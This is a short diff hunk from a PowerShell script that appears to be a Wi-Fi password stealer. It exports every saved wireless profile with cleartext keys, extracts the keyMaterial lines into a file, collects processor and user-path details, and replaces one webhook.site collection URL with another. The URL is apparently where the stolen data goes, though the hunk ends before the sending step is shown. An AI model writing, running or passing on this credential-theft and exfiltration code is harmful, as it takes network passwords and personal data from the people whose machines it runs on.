@@ -7,7 +7,7 @@ $p = Get-WmiObject -Class Win32_Processor | Select-Object Name, MaxClockSpeed, M
 
 
 netsh wlan export profile key=clear
-$e = "https://webhook.site/2381c0ff-fba9-4ff1-b128-f6f904b6322d"
+$e = "https://webhook.site/8bea2fc7-6683-4ca5-a089-c942c56cdd3a"
 powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
 $data = @{
     "UserName" = [System.IO.Path]::Combine($env:APPDATA)
